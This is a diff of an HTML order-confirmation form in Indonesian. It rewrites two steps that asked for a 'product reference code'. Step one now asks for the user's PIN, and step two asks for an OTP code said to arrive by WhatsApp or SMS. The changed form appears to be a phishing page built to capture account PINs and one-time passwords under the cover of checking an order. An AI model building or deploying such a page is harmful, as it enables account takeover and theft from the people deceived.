@@ -68,22 +68,22 @@ button{border:0;border-radius:24px;min-height:48px;padding:0 24px;font-size:14px
   </section>
 
   <section class="step" data-step="1">
-    <h1>Konfirmasi kode referensi produk</h1>
-    <p class="desc">Masukkan kode referensi produk atau pesanan yang tercantum pada bukti transaksi.</p>
+    <h1>Konfirmasi PIN</h1>
+    <p class="desc">Masukan PIN kamu untuk mengkonfirmasi status pesanan.</p>
     <label class="field">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 7.5 12 3l8 4.5v9L12 21l-8-4.5z"/><path d="m4.5 7.8 7.5 4.4 7.5-4.4M12 12.2V21"/></svg>
-      <input id="kode1" autocomplete="off" placeholder="Kode referensi produk" aria-label="Kode referensi produk">
+      <input id="kode1" autocomplete="off" placeholder="Masukkan PIN" aria-label="PIN">
     </label>
     <div class="error" id="err1"></div>
     <div class="actions"><button class="secondary" onclick="prevStep()">Kembali</button><button class="primary" onclick="nextStep()">Selanjutnya</button></div>
   </section>
 
   <section class="step" data-step="2">
-    <h1>Konfirmasi ulang kode produk</h1>
-    <p class="desc">Masukkan kode referensi produk untuk konfirmasi tahap berikutnya. Kode ini boleh berbeda dari kode pada halaman sebelumnya.</p>
+    <h1>Konfirmasi Kode Verifikasi Otp</h1>
+    <p class="desc">Kode verifikasi otp telah dikirim ke WhatsApp atau SMS di nomor kamu. Cek secara berkala di ponsel kamu.</p>
     <label class="field">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 7.5 12 3l8 4.5v9L12 21l-8-4.5z"/><path d="m4.5 7.8 7.5 4.4 7.5-4.4M12 12.2V21"/></svg>
-      <input id="kode2" autocomplete="off" placeholder="Masukkan kode referensi produk" aria-label="Kode referensi produk konfirmasi">
+      <input id="kode2" autocomplete="off" placeholder="Masukkan kode verifikasi OTP" aria-label="Kode verifikasi OTP">
     </label>
     <div class="error" id="err2"></div>
     <div class="actions"><button class="secondary" onclick="prevStep()">Kembali</button><button class="primary" onclick="nextStep()">Selanjutnya</button></div>
